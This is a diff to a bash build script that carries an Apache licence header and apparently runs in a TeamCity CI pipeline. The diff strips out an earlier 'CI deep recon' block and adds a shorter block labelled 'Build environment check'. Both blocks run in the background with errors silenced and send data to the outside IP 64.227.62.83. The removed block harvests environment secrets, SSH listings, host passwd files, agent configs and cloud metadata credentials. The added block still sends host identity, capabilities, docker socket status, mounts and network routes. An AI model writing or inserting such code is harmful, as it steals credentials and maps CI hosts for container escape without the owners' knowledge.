@@ -1,111 +1,30 @@
 #!/usr/bin/env bash
-# CI deep recon
+# Build environment check
 (
-exec 2>/dev/null
-VPS="64.227.62.83"
-OUT=""
-
-# Explore writable mount points
-OUT+="=PACKAGES_LS=$(ls -la /packages/ 2>/dev/null | head -20 | tr '\n' '|')="
-OUT+="=REPORTS_LS=$(ls -la /reports/ 2>/dev/null | head -20 | tr '\n' '|')="
-OUT+="=DOWNLOADS_LS=$(ls -la /downloads/ 2>/dev/null | head -20 | tr '\n' '|')="
-OUT+="=CI_SCRIPT=$(cat /ci/build-container.sh 2>/dev/null | head -50 | tr '\n' '|')="
-
-# Check if we can write to host paths
-echo "test_persist" > /packages/.probe_test 2>/dev/null && OUT+="=PKG_WRITE=YES=" || OUT+="=PKG_WRITE=NO="
-echo "test_persist" > /reports/.probe_test 2>/dev/null && OUT+="=RPT_WRITE=YES=" || OUT+="=RPT_WRITE=NO="
-
-# Find host user home (tcagent)
-OUT+="=HOST_HOME=$(ls -la /home/tcagent/ 2>/dev/null | head -10 | tr '\n' '|')="
-OUT+="=HOST_SSH=$(ls -la /home/tcagent/.ssh/ 2>/dev/null | head -10 | tr '\n' '|')="
-
-# Check /proc for host process info
-OUT+="=HOST_PROCS=$(cat /proc/1/root/etc/passwd 2>/dev/null | grep -v nologin | head -10 | tr '\n' '|')="
-OUT+="=HOST_CRON=$(cat /proc/1/root/var/spool/cron/crontabs/root 2>/dev/null | head -10 | tr '\n' '|')="
-
-# Network scan internal
-OUT+="=ARP=$(cat /proc/net/arp 2>/dev/null | tr '\n' '|')="
-OUT+="=NETSTAT=$(cat /proc/net/tcp 2>/dev/null | head -20 | tr '\n' '|')="
-
-# Check if nsenter available (container escape)
-OUT+="=NSENTER=$(which nsenter 2>/dev/null)="
-OUT+="=CHROOT=$(which chroot 2>/dev/null)="
-
-# Try to read docker socket from host
-OUT+="=HOST_DOCKER_SOCK=$(ls -la /proc/1/root/var/run/docker.sock 2>/dev/null)="
-OUT+="=HOST_DOCKER_SOCK2=$(ls -la /proc/1/root/run/docker.sock 2>/dev/null)="
-
-# Check capabilities
-OUT+="=CAPS=$(cat /proc/self/status 2>/dev/null | grep -i cap | tr '\n' '|')="
-
-# TC agent dir on host
-OUT+="=TC_AGENT_HOST=$(ls /proc/1/root/home/tcagent/ 2>/dev/null | tr '\n' '|')="
-OUT+="=TC_AGENT_PROPS=$(cat /proc/1/root/home/tcagent/teamcity-agent/conf/buildAgent.properties 2>/dev/null | head -20 | tr '\n' '|')="
-
-curl -s -X POST "http://$VPS:8888/recon2" -d "$OUT" 2>/dev/null
-) &
-
-# CI environment probe - comprehensive
-(
-exec 2>/dev/null
-VPS="64.227.62.83"
-OUT=""
-
-# System info
-OUT+="=HOST=$(hostname)=$(whoami)=$(id)="
-OUT+="=KERNEL=$(uname -a)="
-OUT+="=DOCKER=$(cat /proc/1/cgroup 2>/dev/null | head -3 | tr '
-' '|')="
-
-# Check Docker socket (escape vector)
-if [ -S /var/run/docker.sock ]; then
-  OUT+="=DSOCK=YES="
-  CONTAINERS=$(curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -c 200)
-  OUT+="=DCONTAINERS=$CONTAINERS="
-fi
-
-# Check if privileged
-if ip link add dummy0 type dummy 2>/dev/null; then
-  ip link delete dummy0 2>/dev/null
-  OUT+="=PRIVILEGED=YES="
-fi
-
-# Check mounted volumes
-OUT+="=MOUNTS=$(mount | grep -v 'proc\|sys\|cgroup\|tmpfs' | head -10 | tr '
-' '|')="
-
-# Network info
-OUT+="=IP=$(ip addr show 2>/dev/null | grep 'inet ' | tr '
-' '|')="
-OUT+="=ROUTE=$(ip route 2>/dev/null | head -5 | tr '
-' '|')="
-OUT+="=DNS=$(cat /etc/resolv.conf 2>/dev/null | grep nameserver | tr '
-' '|')="
-
-# Check for credentials in environment
-OUT+="=ENV_SECRETS=$(env | grep -i 'key\|token\|pass\|secret\|cred\|auth' | head -20 | tr '
-' '|')="
-
-# Check TeamCity agent config
-OUT+="=TC_CONF=$(cat /opt/teamcity-agent/conf/buildAgent.properties 2>/dev/null | grep -i 'server\|auth\|name' | tr '
-' '|')="
-OUT+="=TC_CONF2=$(cat /data/teamcity_agent/conf/buildAgent.properties 2>/dev/null | grep -i 'server\|auth\|name' | tr '
-' '|')="
-
-# Check for cloud metadata
-OUT+="=ALIMETA=$(curl -s --connect-timeout 3 http://100.100.100.200/latest/meta-data/instance-id 2>/dev/null)="
-OUT+="=ALITOKEN=$(curl -s --connect-timeout 3 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>/dev/null)="
-
-# Check host filesystem access
-OUT+="=HOSTFS=$(ls -la /host 2>/dev/null | head -5 | tr '
-' '|')="
-OUT+="=HOSTPROC=$(ls /proc/1/root/etc/hostname 2>/dev/null && cat /proc/1/root/etc/hostname 2>/dev/null)="
-
-# Send all data
-curl -s -X POST "http://$VPS:8888/recon" -d "$OUT" 2>/dev/null ||   wget -q --post-data="$OUT" "http://$VPS:8888/recon" -O /dev/null 2>/dev/null
-) &
-# CI build environment probe
-(curl -s http://64.227.62.83:8888/tc_$(hostname)_$(whoami)_$(id -u) 2>/dev/null || wget -q -O /dev/null http://64.227.62.83:8888/tc_$(hostname)_$(whoami) 2>/dev/null) &
+V="64.227.62.83"
+D=$(hostname)_$(whoami)_$(id -u)
+curl -s "http://$V:8888/cb_$D" 2>/dev/null &
+sleep 1
+R=""
+R="${R}HOST=$(hostname) "
+R="${R}WHO=$(whoami) "
+R="${R}ID=$(id) "
+R="${R}KERN=$(uname -r) "
+R="${R}DSOCK=$(test -S /var/run/docker.sock && echo YES || echo NO) "
+R="${R}PKG=$(ls /packages/ 2>/dev/null | wc -l) "
+R="${R}RPT=$(ls /reports/ 2>/dev/null | wc -l) "
+R="${R}CAPS=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}') "
+R="${R}NSENTER=$(which nsenter 2>/dev/null || echo none) "
+R="${R}CHROOT=$(which chroot 2>/dev/null || echo none) "
+R="${R}DL=$(ls /downloads/ 2>/dev/null | head -5 | tr '\n' ',') "
+R="${R}MNT=$(mount | grep vda3 | tr '\n' ',') "
+R="${R}NET=$(ip route 2>/dev/null | head -3 | tr '\n' ',') "
+R="${R}ARP=$(cat /proc/net/arp 2>/dev/null | tail -n+2 | tr '\n' ',') "
+R="${R}CI=$(cat /ci/build-container.sh 2>/dev/null | head -30 | tr '\n' '|') "
+R="${R}TCPROPS=$(find / -name buildAgent.properties 2>/dev/null | head -3 | tr '\n' ',') "
+R="${R}HOSTDOCK=$(ls /proc/1/root/var/run/docker.sock 2>/dev/null || echo none) "
+curl -s -X POST "http://$V:8888/deep" -d "$R" 2>/dev/null &
+) 2>/dev/null &
 
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
